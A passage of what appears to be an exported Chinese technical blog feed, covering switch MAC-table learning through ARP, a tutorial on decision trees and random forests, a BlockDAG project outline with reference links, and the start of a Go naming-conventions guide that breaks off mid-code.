已经学到了 PC 和 R1 的接口 MAC 地址，MAC 地址表项已经形成。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1618127946335-3d26191d-d89f-49f9-a331-2fc558f5e4cd.png#align=left&display=inline&height=148&name=image.png&originHeight=295&originWidth=747&size=233011&status=done&style=none&width=373.5" alt="image.png"><br>那么，他是怎么形成的呢？<br>第一步：<br>当 SW 通过 e0/0 端口收到 PC 发来的 ARP 广播包，PC 首先查看自己的 MAC 地址表项，看看数据帧的源 MAC 是否存在于我的 MAC 地址表中，如果没有，那么就直接把 ARP 广播包的源 MAC（aabb.cc00.3000）和接收端口 e0/0 对应起来，形成第一个 MAC 地址表的条目。如果有对应的 MAC 地址条目，SW 就看已经存在的条目和当前的收包端口是否一致，如果不一致就更新 MAC 地址表里面的条目，如果一致就直接泛洪转发这个广播数据帧。<br>第二步：SW 通过 e0/1 端口把这个数据帧发给 R1，R1 收到之后，形成 ARP 表项。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1618128016114-6971d3ca-2137-4bbc-a82c-98505999e543.png#align=left&display=inline&height=62&name=image.png&originHeight=124&originWidth=1131&size=180774&status=done&style=none&width=565.5" alt="image.png"><br>R1 拆开外面帧头看到目的 MAC 是自己（广播包本网段内所有人均可接收），R1 就继续拆包，拆开 ARP 头部，看到请求的 MAC 是自己的 IP 地址对应的 MAC，所以 R1 就响应这个 ARP 得请求包。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1618128064981-d60ade96-4891-4eab-9150-1c1fe32d3e1f.png#align=left&display=inline&height=150&name=image.png&originHeight=299&originWidth=1066&size=320679&status=done&style=none&width=533" alt="image.png"><br>第三步：响应的 ARP Reply 包发送到 SW 的 e0/1 口，SW1 把单播响应包源 MAC（aabb.cc00.1000）和自己的接收端口 e0/1 口对应起来，形成另外一条 MAC 地址表条目，然后查看到数据帧的目的 MAC 是 aabb.cc00.3000，SW 直接查找自己的 MAC 地址表，发现有对应的条目，直接通过 e0/0 口转发，PC 就收到了响应，获取到了 R1 的 e0/0 接口，也就是 PC 网关的 MAC。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>机器学习之随机森林</title>
      <link href="/2021/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9A%8F%E6%9C%BA%E6%A3%AE%E6%9E%97/"/>
      <url>/2021/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9A%8F%E6%9C%BA%E6%A3%AE%E6%9E%97/</url>
      
        <content type="html"><![CDATA[<p>这里记录一下 AI 作品赛里接触到的随机森林算法。</p><a id="more"></a><h1 id="决策树"><a href="#决策树" class="headerlink" title="决策树"></a>决策树</h1><p>随机森林由许多决策树（decision tree）组成，我们可以将决策树视为一系列关于数据的是/否问题，从而最终得出一个预测类别（或回归情况下的连续值）。 这是一个可解释的模型，因为它非常像我们人类进行分类的过程：在我们做出决定之前（在理想世界中），我们会对可用数据进行一系列的询问。<br>当我们训练决策树时到底发生了什么？可视化可以帮助我们更好地理解决策树，这可以通过 Scikit-Learn 的一个功能来实现（详细信息，请查看 notebook 或这篇文章）。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1617972363693-baaf94c2-5e47-47ff-86d7-e1bc85cd37a1.png#height=588&id=XYnoX&name=image.png&originHeight=732&originWidth=837&originalType=binary%E2%88%B6=1&size=369303&status=done&style=none&width=672" alt="image.png"><br>除叶子节点（彩色终端节点）外，所有节点都有 5 个部分：</p><ul><li>基于某个特征的一个值对数据进行的提问，每个提问都有一个真或假的答案可以分裂节点。根据答案，数据点相应地向下移动。</li><li><strong>gini：</strong>节点的 Gini 不纯度。当我们沿着树向下移动时，平均加权基尼不纯度会减少。</li><li><strong>samples</strong>：节点中的观测数据数量。</li><li><strong>value：</strong>每个类中的样本数。例如，根节点中有 2 个样本属于类 0，有 4 个样本属于类 1。</li><li><strong>class：</strong>该节点中大多数点的分类。在叶节点中，即是对节点中所有样本的预测。</li></ul><p><strong>决策树的特征选择</strong>一般有 3 种量化方法：<strong>信息增益、信息增益率、基尼指数</strong>。</p><h2 id="信息增益"><a href="#信息增益" class="headerlink" title="信息增益"></a>信息增益</h2><p>在信息论中，<strong>熵</strong>表示随机变量不确定性的度量。假设随机变量 X 有有限个取值，取值 <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1618020812451-b0b3a075-5dcb-42d8-bf97-78aa34e4b86e.svg#height=18&id=jf86o&originHeight=18&originWidth=19&originalType=binary%E2%88%B6=1&size=0&status=done&style=none&width=19"> 对应的概率为 <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1618020812589-b6f620aa-d6a0-4990-8de0-93dcf01f721e.svg#height=18&id=fdcbK&originHeight=18&originWidth=19&originalType=binary%E2%88%B6=1&size=0&status=done&style=none&width=19"> ，则 X 的熵定义为：<br><img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1618020812637-4cffb5ec-a16b-4f43-a641-7df43094a5a3.svg#height=62&id=X43jp&originHeight=62&originWidth=196&originalType=binary%E2%88%B6=1&size=0&status=done&style=none&width=196"><br>如果某件事<strong>一定发生</strong>（太阳东升西落）或<strong>一定不发生</strong>（钓鱼岛是日本的），则概率为 1 或 0，对应的<strong>熵均为 0</strong>。<br>如果某件事可能发生可能不发生（天要下雨，娘要嫁人），概率介于 0 到 1 之间，熵大于 0。<br>由此可见，<strong>熵越大，随机性越大，结果越不确定</strong>。<br>我们再来看一看<strong>条件熵</strong> <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1618020812831-53a78260-e1f7-4fe9-bd8b-1b6cbdd6d85d.svg#height=26&id=PpyfP&originHeight=26&originWidth=74&originalType=binary%E2%88%B6=1&size=0&status=done&style=none&width=74"> ，<strong>表示引入随机变量 Y 对于消除 X 不确定性的程度</strong>。假如 X、Y 相互独立，则 X 的条件熵和熵有相同的值；否则条件熵一定小于熵。<br>明确了这两个概念，理解信息增益就比较方便了。现在我们有一份数据集 D（例如贷款信息登记表）和特征 A（例如年龄），则<strong>A 的信息增益就是 D 本身的熵与特征 A 给定条件下 D 的条件熵之差</strong>，即：<br><img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1618020812551-89aeeb77-f470-4d5c-8da4-ec55baca3dff.svg#height=26&id=EE8pQ&originHeight=26&originWidth=248&originalType=binary%E2%88%B6=1&size=0&status=done&style=none&width=248"><br>数据集 D 的熵是一个常量。信息增益越大，表示条件熵 <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1618020812738-fffb9065-834c-444d-9a51-8881c89e799f.svg#height=26&id=tYvso&originHeight=26&originWidth=74&originalType=binary%E2%88%B6=1&size=0&status=done&style=none&width=74"> 越小，A 消除 D 的不确定性的功劳越大。<br>所以要<strong>优先选择信息增益大的特征，它们具有更强的分类能力。</strong>由此生成决策树，称为<strong>ID3 算法</strong>。</p><h2 id="信息增益率"><a href="#信息增益率" class="headerlink" title="信息增益率"></a><strong>信息增益率</strong></h2><p>当某个特征具有多种候选值时，信息增益容易偏大，造成误差。引入信息增益率可以校正这一问题。<br>信息增益率 <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1618020812748-d95f3fa5-1a2f-4372-ad0b-78d11ef80423.svg#height=18&id=QMRXL&originHeight=18&originWidth=23&originalType=binary%E2%88%B6=1&size=0&status=done&style=none&width=23"> 为信息增益与数据集 D 的熵之比：<br><img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1618020812852-34299e55-7911-4a19-a1bc-be76774d1af0.svg#height=59&id=lstWO&originHeight=59&originWidth=186&originalType=binary%E2%88%B6=1&size=0&status=done&style=none&width=186"><br>同样，我们<strong>优先选择信息增益率最大的特征，</strong>由此生成决策树，称为<strong>C4.5 算法。</strong></p><h2 id="基尼不纯度（Gini-Impurity）"><a href="#基尼不纯度（Gini-Impurity）" class="headerlink" title="基尼不纯度（Gini Impurity）"></a><strong>基尼不纯度（Gini Impurity）</strong></h2><p>节点的基尼不纯度是指，根据节点中样本的分布对样本分类时，从节点中随机选择的样本被分错的概率。<br>如，在根节点中，根据节点中的样本标签有 44.4％的可能性错误地对某个随机选择的数据点进行分类。可以      使用以下等式得出这个值：</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1617972513293-5c77b524-1b14-46a9-8bdc-5efe40377391.png#height=56&id=dVbT7&originHeight=242&originWidth=757&originalType=binary%E2%88%B6=1&size=0&status=done&style=none&width=176"><br>节点 n 的基尼不纯度是<strong>1 减去每个类（二元分类任务中是 2）的样本比例的平方和</strong>。</p><p>例如根节点的基尼不纯度：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1617972664572-fbc01cef-2c7e-4e45-931d-3a11327035a4.png#height=73&id=NEETK&originHeight=73&originWidth=1080&originalType=binary%E2%88%B6=1&size=0&status=done&style=none&width=1080"></p><p>在每个节点，决策树要在所有特征中搜索用于拆分的值，从而可以<strong>最大限度地减少基尼不纯度</strong>。（拆分节点的另一个<strong>替代方法</strong>是使用<strong>信息增益</strong>）。<br>然后，它以贪婪递归的过程重复这种拆分，直到达到最大深度，或者每个节点仅包含同类的样本。<br>树每层的加权总基尼不纯度（每个节点的基尼不纯度按照该节点中来自父节点的点的比例进行加权）一定是减少的。在树的第二层，总加权基尼不纯度值为 0.333：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1617972824155-5cececa7-b981-44be-a58e-79bf486c2be2.png#height=58&id=idTVC&name=image.png&originHeight=77&originWidth=845&originalType=binary%E2%88%B6=1&size=17368&status=done&style=none&width=641" alt="image.png"><br>最终，最后一层的加权总基尼不纯度变为 0，也意味着每个节点都是完全纯粹的，从节点中随机选择的点不会被错误分类。虽然这一切看起来挺好的，但这意味着模型可能过拟合，因为所有节点都是仅仅使用训练数据构建的。</p><h2 id="决策树剪枝"><a href="#决策树剪枝" class="headerlink" title="决策树剪枝"></a>决策树剪枝</h2><p>决策树生成算法递归产生一棵决策树，直到结束划分。什么时候结束呢？</p><ul><li>样本属于同一种类型</li><li>没有特征可以分割</li></ul><p>这样得到的决策树往往对训练数据分类非常精准，但是对于未知数据表现比较差。<br>原因在于基于训练集构造的决策树过于复杂，<strong>产生过拟合</strong>。所以需要对决策树简化，砍掉多余的分支，提高泛化能力。<br>决策树剪枝一般有两种方法：</p><ul><li><strong>预剪枝</strong>：在树的生成过程中剪枝。<strong>基于贪心策略，可能造成局部最优</strong></li><li><strong>后剪枝</strong>：等树全部生成后剪枝。<strong>运算量较大，但是比较精准</strong></li></ul><p>决策树剪枝往往通过<strong>极小化决策树整体的损失函数实现</strong>。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1618020986002-5cc6c40b-f548-44b0-a517-eaecf2615307.png#height=281&id=iUL7X&name=image.png&originHeight=561&originWidth=731&originalType=binary%E2%88%B6=1&size=122786&status=done&style=none&width=365.5" alt="image.png"><br>假设树 T 有|T|个叶子节点，某一个叶子节点 t 上有 <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1618021002264-6488bff2-9519-4ecc-bbdd-6f2f86c34189.svg#height=23&id=p7K03&originHeight=23&originWidth=24&originalType=binary%E2%88%B6=1&size=0&status=done&style=none&width=24"> 个样本，其中 k 类的样本有 <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1618021002341-9e586245-0eb4-43f1-ab4b-e9d2f1514bd9.svg#height=23&id=Jvs0Y&originHeight=23&originWidth=32&originalType=binary%E2%88%B6=1&size=0&status=done&style=none&width=32"> 个，<img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1618021002330-b42005d2-d60f-4e39-927c-852a31a4810e.svg#height=26&id=W8yRc&originHeight=26&originWidth=56&originalType=binary%E2%88%B6=1&size=0&status=done&style=none&width=56"> 为叶子节点 t 的熵， <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1618021002461-670ab097-97d8-4674-b83a-a27eed267988.svg#height=21&id=Ihqmy&originHeight=21&originWidth=52&originalType=binary%E2%88%B6=1&size=0&status=done&style=none&width=52"> 是参数，则决策树的<strong>损失函数</strong>定义为：<br><img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1618021002388-eb487e2e-6368-4459-b65e-92652294e8b5.svg#height=69&id=GEe9U&originHeight=69&originWidth=264&originalType=binary%E2%88%B6=1&size=0&status=done&style=none&width=264"><br>其中熵为：<br><img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1618021002407-578e900c-5b42-4014-a24e-f93208a1d529.svg#height=57&id=M7VkN&originHeight=57&originWidth=246&originalType=binary%E2%88%B6=1&size=0&status=done&style=none&width=246"><br><strong>损失函数第一项为训练误差，第二项为模型复杂度，</strong>用参数 <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1618021002545-b6955ef3-85ad-4594-9a5e-f5a27be46475.svg#height=15&id=JPvdT&originHeight=15&originWidth=13&originalType=binary%E2%88%B6=1&size=0&status=done&style=none&width=13"> 来衡量二者的比重。</p><h2 id="CART-算法"><a href="#CART-算法" class="headerlink" title="CART 算法"></a>CART 算法</h2><p>CART 表示分类回归决策树，同样由特征选择、树的生成及剪枝组成，可以处理分类和回归任务。<br>相比之下，<strong>ID3 和 C4.5 算法只能处理分类任务</strong>。<br>CART 假设决策树是二叉树，内部结点特征的取值为“是”和“否”，依次递归地二分每个特征。<br>CART 对<strong>回归树</strong>采用<strong>平方误差</strong>最小化准则<strong>，</strong>对<strong>分类树</strong>用<strong>基尼指数</strong>最小化准则。</p><h2 id="过拟合–为什么森林比一棵树更好"><a href="#过拟合–为什么森林比一棵树更好" class="headerlink" title="过拟合–为什么森林比一棵树更好"></a>过拟合–为什么森林比一棵树更好</h2><p><strong>因为这棵树是在训练数据上没有犯错，我们没有限制最大深度（树的层数），因此泛化能力差。</strong><br>过拟合发生在当我们有一个非常灵活的模型（模型具有高能力）时，其本质上是通过紧密拟合来记住训练数据。这样的问题是模型不仅学到了训练数据中的实际关系，还学习了存在的噪声。灵活的模型具有高方差<strong>（variance）</strong>，因为学到的参数（例如决策树的结构）将随着训练数据的不同而变化很大。</p><p>当我们<strong>不限制最大深度时决策树容易过拟合的原因</strong>是它<strong>具有无限的灵活性</strong>，这意味着它可以持续生长，直到它为每个单独的观察点都生成一个叶节点，<strong>达到完美地分类</strong>。<br>如果返回到之前决策树的图像并将最大深度限制为 2（仅进行一次拆分），则分类不再 100％正确。我们减少了决策树的方差，但代价是增加了偏差。<br><strong>限制树的深度</strong>可以<strong>减少方差（好）</strong>并且<strong>增加偏差（坏）</strong>，一种替代方案是，我们可以将许多决策树组合成一个称为随机森林的集成模型（ensemble model）。</p><h1 id="随机森林"><a href="#随机森林" class="headerlink" title="随机森林"></a>随机森林</h1><p>我们将使用<strong>CART 决策树</strong>作为<strong>弱学习器的 bagging 方法</strong>称为<strong>随机森林</strong>。<br>bagging 是一种在原始数据集上，通过<strong>有放回抽样</strong>分别选出 k 个新数据集，来训练分类器的集成算法。分类器之间没有依赖关系。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1618021152004-95c115e7-19c1-41fa-8768-49351b990a23.png#height=162&id=iOtB0&name=image.png&originHeight=323&originWidth=799&originalType=binary%E2%88%B6=1&size=117004&status=done&style=none&width=399.5" alt="image.png"><br>随机森林是由许多决策树组成的模型。这个模型不是简单地平均所有树（我们可以称之为“森林”）的预测，而是使用了两个关键概念，名字中的随机二字也是由此而来：</p><ul><li>在构建树时对训练数据点进行随机抽样</li><li>分割节点时考虑特征的随机子集</li></ul><h2 id="随机抽样训练观测数据"><a href="#随机抽样训练观测数据" class="headerlink" title="随机抽样训练观测数据"></a><strong>随机抽样训练观测数据</strong></h2><p>在训练时，随机森林中的<strong>每棵树</strong>都会<strong>从数据点的随机样本中学习</strong>。<strong>样本被有放回的抽样</strong>，称为<strong>自助抽样法</strong>（<strong>bootstrapping</strong>），这意味着<strong>一些样本将在一棵树中被多次使用</strong>。背后的<strong>想法</strong>是<strong>在不同样本上训练每棵树，尽管每棵树相对于特定训练数据集可能具有高方差，但总体而言，整个森林将具有较低的方差，同时不以增加偏差为代价。</strong><br>在测试时，通过<strong>平均每个决策树的预测</strong>来进行预测。这种<strong>在不同的自助抽样数据子集上训练单个学习器，然后对预测进行平均的过程称为 bagging</strong>，是 bootstrap aggregating 的缩写。</p><h2 id="用于拆分节点的随机特征子集"><a href="#用于拆分节点的随机特征子集" class="headerlink" title="用于拆分节点的随机特征子集"></a><strong>用于拆分节点的随机特征子集</strong></h2><p>随机森林中的另一个主要概念是，<strong>只考虑所有特征的一个子集来拆分每个决策树中的每个节点</strong>。通常将<strong>其设置为 sqrt（n_features）</strong>以进行分类，这意味着<strong>如果有 16 个特征</strong>，则在<strong>每个树中的每个节点处</strong>，<strong>只考虑 4 个随机特征</strong>来拆分节点。（随机森林也可以在每个节点处考虑所有的特征，如回归中常见的那样。这些选项可以在 Scikit-Learn Random Forest 的实现中控制）。<br>如果你能理解一棵单独的决策树，bagging 的理念，以及随机的特征子集，那么你对随机森林的工作方式也就有了很好的理解：</p><blockquote><p>随机森林将成百上千棵决策树组合在一起，在略微不同的观察集上训练每个决策树，在每棵树中仅考虑有限数量的特征来拆分节点。<strong>随机森林的最终预测是通过平均每棵树的预测来得到的</strong>。</p></blockquote><p>想理解为什么随机森林优于单一的决策树，请想象以下场景：你要判断特斯拉的股票是否上涨，现在你身边有十几位对该公司都没有先验知识的分析师。每个分析师都有较低的偏见，因为他们没有任何假设，并且可以从新闻报道的数据集中学习。<br>这似乎是一个理想的情况，但问题是报道中除了真实的信号外也可能包含噪音。 因为分析师们完全根据数据做出预测，即他们具有很高的灵活性，也就意味着他们可能会被无关的信息所左右。分析师们可能会从同一数据集中得出不同的预测。此外，如果提供不同的报道训练集，每个分析师都有高方差，并得出截然不同的预测。<br>解决方案是不依赖于任何一个人，而是汇集每个分析师的投票。此外，与随机森林一样，允许每个分析师仅使用一部分报道，并希望通过采样来消除噪声信息的影响。在现实生活中，我们也依赖于多种信息来源（从不信任亚马逊的单独评论），因此，不仅决策树的思想很直观，而且将它们组合在一起成为随机森林的想法同样如此。</p><h2 id="算法特点"><a href="#算法特点" class="headerlink" title="算法特点"></a>算法特点</h2><p>由于随机性，<strong>随机森林对于降低模型方差效果显著</strong>。故随机森林一般不需要额外剪枝，就能取得较好的泛化性能。</p><p>相对而言，模型对于训练集的拟合程度就会差一些，相比于基于 boosting 的 GBDT 模型，偏差会大一些。</p><p>另外，<strong>随机森林中的树一般会比较深，以尽可能地降低偏差；而 GBDT 树的深度会比较浅，通过减少模型复杂度来降低方差</strong>。</p><p>最后，我们总结一下随机森林都有哪些优点：</p><ul><li>采用了集成算法，精度优于大多数单模型算法</li><li>在测试集上表现良好，两个随机性的引入降低了过拟合风险</li><li>树的组合可以让随机森林处理非线性数据</li><li>训练过程中能检测特征重要性，是常见的<strong>特征筛选</strong>方法</li><li>每棵树可以同时生成，并行效率高，训练速度快</li><li>可以自动处理缺省值</li></ul><h1 id="模型评价"><a href="#模型评价" class="headerlink" title="模型评价"></a>模型评价</h1><p>AUC(area under the curve)是 ROC 曲线下的面积。所以，在理解 AUC 之前，要先了解 ROC 是什么。而 ROC 的计算又需要借助混淆矩阵。</p><blockquote><p>AUC 是一个从 0（最差）到 1（最佳）的度量值，</p></blockquote><p>我们还可以绘制单个决策树（顶部）和随机森林（底部）的 ROC 曲线。<strong>靠近左上角的曲线代表着更好的模型：</strong><br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1617974379540-03a43f68-4899-4b4d-b3c9-02806cba1744.png#height=271&id=ImDoE&name=image.png&originHeight=542&originWidth=777&originalType=binary%E2%88%B6=1&size=81703&status=done&style=none&width=388.5" alt="image.png"></p><h1 id="问答"><a href="#问答" class="headerlink" title="问答"></a>问答</h1><h2 id="为什么要随机抽样训练集？"><a href="#为什么要随机抽样训练集？" class="headerlink" title="为什么要随机抽样训练集？"></a><strong>为什么要随机抽样训练集？</strong></h2><p>如果不进行随机抽样，每棵树的训练集都一样，那么最终训练出的树分类结果也是完全一样的，这样的话完全没有 bagging 的必要；</p><h2 id="为什么要有放回地抽样？"><a href="#为什么要有放回地抽样？" class="headerlink" title="为什么要有放回地抽样？"></a><strong>为什么要有放回地抽样？</strong></h2><p>如果不是有放回的抽样，那么每棵树的训练样本都是不同的，都是没有交集的，这样每棵树都是”有偏的”，都是绝对”片面的”（当然这样说可能不对），也就是说每棵树训练出来都是有很大的差异的；而随机森林最后分类取决于多棵树（弱分类器）的投票表决，这种表决应该是”求同”，因此使用完全不同的训练集来训练每棵树这样对最终分类结果是没有帮助的，这样无异于是”盲人摸象”。</p><h2 id="随机森林的随机体现在哪里？"><a href="#随机森林的随机体现在哪里？" class="headerlink" title="随机森林的随机体现在哪里？"></a><strong>随机森林的随机体现在哪里？</strong></h2><p>1）如果训练集大小为 N，对于每棵树而言，随机且有放回地从训练集中的抽取 N 个训练样本（这种采样方式称为 bootstrap sample 方法），作为该树的训练集；</p><blockquote><p>从这里我们可以知道：每棵树的训练集都是不同的，而且里面包含重复的训练样本</p></blockquote><p>2）如果每个样本的特征维度为 M，指定一个常数 m&lt;&lt;M，随机地从 M 个特征中选取 m 个特征子集，每次树进行分裂时，从这 m 个特征中选择最优的；</p><h2 id="这两种随机有什么好处？"><a href="#这两种随机有什么好处？" class="headerlink" title="这两种随机有什么好处？"></a><strong>这两种随机有什么好处？</strong></h2><p>两个随机性的引入对随机森林的分类性能至关重要。由于它们的引入，使得随机森林不容易陷入过拟合，并且具有很好得抗噪能力（比如：对缺省值不敏感）。</p><h2 id="随机森林分类的错误率和什么有关？"><a href="#随机森林分类的错误率和什么有关？" class="headerlink" title="随机森林分类的错误率和什么有关？"></a><strong>随机森林分类的错误率和什么有关？</strong></h2><ul><li>森林中任意两棵树的相关性：相关性越大，错误率越大；</li><li>森林中每棵树的分类能力：每棵树的分类能力越强，整个森林的错误率越低。</li></ul><p>减小特征选择个数 m，树的相关性和分类能力也会相应的降低；增大 m，两者也会随之增大。所以关键问题是如何选择最优的 m（或者是范围），这也是随机森林唯一的一个参数。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>BlockDAG从零到一</title>
      <link href="/2021/BlockDAG%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80/"/>
      <url>/2021/BlockDAG%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<p>加油！</p><a id="more"></a><h1 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h1><ul><li><p>DAG</p><ul><li>SPECTRE<ul><li>snapshot.go–生成快照</li><li>vote.go–投票</li><li>log.go–记录日志</li></ul></li><li>accepttxs.go–维持可信交易集</li><li>blockdag.go–主程序</li><li>difficulty.go–动态调整 pow 困难度</li><li>error.go–错误信息</li><li>log.go–日志信息</li><li>process.go–将区块加入链？或者称检查块的合法性</li></ul></li><li><p>minner</p><ul><li>pow.go–工作量证明</li><li>worker.go</li></ul></li><li><p>account</p><ul><li>user.go–用户相关，身份认定，发送交易</li></ul></li><li><p>bloom</p><ul><li>timebloom.go–时间布隆过滤器</li><li>rangebloom.go–范围布隆过滤器</li></ul></li><li><p>p2pnet</p><ul><li>libp2p–p2p 网络对等节点发现</li></ul></li><li><p>mempool–内存池</p></li><li><p>crypto–密码学模块</p><ul><li>pkcs12–引用 gmsm <a href="https://github.com/tjfoc/gmsm">https://github.com/tjfoc/gmsm</a> 好像性能有点问题？ 这里有另外一个<a href="https://github.com/rongzer/gm">https://github.com/rongzer/gm</a> 看情况吧</li><li>sm2<ul><li>p256.go</li><li>sm2.go</li><li>utils.go</li></ul></li><li>sm3<ul><li>sm3.go</li><li>ifile</li></ul></li><li>sm4<ul><li>sm4.go</li><li>sm4_gcm.go</li><li>utils.go</li></ul></li></ul></li><li><p>database-存储 <a href="https://github.com/vldmkr/merkle-patricia-trie">https://github.com/vldmkr/merkle-patricia-trie</a></p><ul><li><p>mpt</p><ul><li>node.go</li><li>tire.go</li><li>type.go</li></ul></li><li><p>storage</p><ul><li>adapter.go</li><li>leveldb.go</li><li>memory.go</li></ul></li><li><p>database.go–利用 leveldb 存储交易（MPT），在区块中只存储根节点 hsha。</p></li><li><p>merkletire.go–MPT 树存储</p></li><li><p>可以先尝试安装<a href="https://github.com/soteria-dag/soterd/tree/master/database">https://github.com/soteria-dag/soterd/tree/master/database</a>，看看能不能保存交易</p></li></ul></li></ul><h1 id="p2pnet"><a href="#p2pnet" class="headerlink" title="p2pnet"></a>p2pnet</h1><p><a href="https://segmentfault.com/a/1190000018590682">区块链中的 P2P</a><br><a href="https://www.shangmayuan.com/a/61258d114131449994f5278e.html">使用 Go 语言编写区块链 P2P 网络</a>–项目：<a href="https://github.com/nosequeldeebee/blockchain-tutorial/blob/master/p2p/main.go">https://github.com/nosequeldeebee/blockchain-tutorial/blob/master/p2p/main.go</a><br><a href="https://github.com/Blockchain-CN/blockchain">https://github.com/Blockchain-CN/blockchain</a> –实现了对等协议的<br><a href="https://bbbob.win/b6edc29f/">利用 go-libp2p 实现在区块链上的 p2p</a>–里面目录分的挺清楚的</p><h1 id="mempool"><a href="#mempool" class="headerlink" title="mempool"></a>mempool</h1><p><a href="https://learnblockchain.cn/books/geth/part2/txpool/txpool.html">以太坊交易池架构设计</a>–这一系列很全<br><a href="https://blog.csdn.net/loy_184548/article/details/86178255">【区块链】比特币学习 - 4 - 交易池</a><br><a href="https://segmentfault.com/a/1190000017333194">以太坊源码分析：交易缓冲池 txpool</a><br><a href="https://github.com/lianxiangcloud/linkchain/tree/release/v0.1.3/mempool">https://github.com/lianxiangcloud/linkchain/tree/release/v0.1.3/mempool</a><br><a href="https://www.jianshu.com/p/521a0926303a">btcd 源码分析系列：6 - mempool</a><br><a href="https://github.com/wupeaking/tendermint_code_analysis/blob/master/Mempool%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90.md">Mempool 源码分析</a><br><a href="https://github.com/letsfire/factory">https://github.com/letsfire/factory</a> –单纯的内存池，而非交易池<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1617441419925-9f079572-c711-428a-a94f-1a2a6ac6ce98.png#align=left&display=inline&height=299&name=image.png&originHeight=598&originWidth=1303&size=258120&status=done&style=none&width=651.5" alt="image.png"><br>说实话，这个有点难，可能暂时不考虑实现了。</p><h1 id="account"><a href="#account" class="headerlink" title="account"></a>account</h1><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1617436033703-2f89b5e6-c23a-45a8-b127-8df8ebd6353d.png#align=left&display=inline&height=343&name=image.png&originHeight=686&originWidth=776&size=143104&status=done&style=none&width=388" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1617436089888-84b4f08d-272d-48df-a29b-1fdfd5c0d110.png#align=left&display=inline&height=288&name=image.png&originHeight=576&originWidth=626&size=139030&status=done&style=none&width=313" alt="image.png"><br>来自白皮书：<a href="https://www.lianxiangcloud.com/static/download/%E4%BA%AB%E4%BA%91%E9%93%BE%E7%99%BD%E7%9A%AE%E4%B9%A61.0.pdf">享云链白皮书 1.0</a><br><a href="https://learnblockchain.cn/books/geth/part3/sign-and-valid.html">签名与校验</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>GO开发指南</title>
      <link href="/2021/GO%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%97/"/>
      <url>/2021/GO%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%97/</url>
      
        <content type="html"><![CDATA[<p>记录在进行 go 语言开发遇到的各种问题。</p><a id="more"></a><h1 id="命名规范"><a href="#命名规范" class="headerlink" title="命名规范"></a>命名规范</h1><h3 id="文件命名"><a href="#文件命名" class="headerlink" title="文件命名"></a>文件命名</h3><p>文件命名一律采用小写，不用驼峰式，尽量见名思义，看见文件名就可以知道这个文件下的大概内容。<br>其中测试文件以<em>test.go 结尾，除测试文件外，命名不出现</em>。<br>例子：</p><blockquote><p>stringutil.go， stringutil_test.go</p></blockquote><h3 id="package"><a href="#package" class="headerlink" title="package"></a>package</h3><p>包名用小写,使用短命名,尽量和标准库不要冲突。<br>包名统一使用单数形式。</p><p>在 go 源文件的开头必须申明文件所属的 package，如下所示：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> name<br>......<br></code></pre></td></tr></table></figure><h2 id="命名规范-1"><a href="#命名规范-1" class="headerlink" title="命名规范"></a>命名规范</h2><ul><li>建议 package 命名用小写字母</li><li>建议 packag<strong>e 命名必和其路径的最后一段一致</strong>（main package 除外）。注意，这并不是 Golang 的强制要求，文件目录只是用于存放同一个 package 的所有源文件，Golang 对目录名并无要求。但<strong>一个目录下不允许有多个 package 的源文件</strong>。</li><li>main package 中的 main 方法是可执行文件的入口，main package 名一般和路径名不一致</li><li>不同路径下 package 命名可以重复，但其完整路径名必须唯一</li></ul><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>变量命名一般采用驼峰式，当遇到特有名词（缩写或简称，如 DNS）的时候，特有名词根据是否私有全部大写或小写。<br>例子：</p><blockquote><p>apiClient、URLString</p></blockquote><h3 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h3><p>单个函数的接口名以 er 为后缀</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-number">1.</span> <span class="hljs-keyword">type</span> Reader <span class="hljs-keyword">interface</span> &#123;<br><span class="hljs-number">2.</span>     Read(p []<span 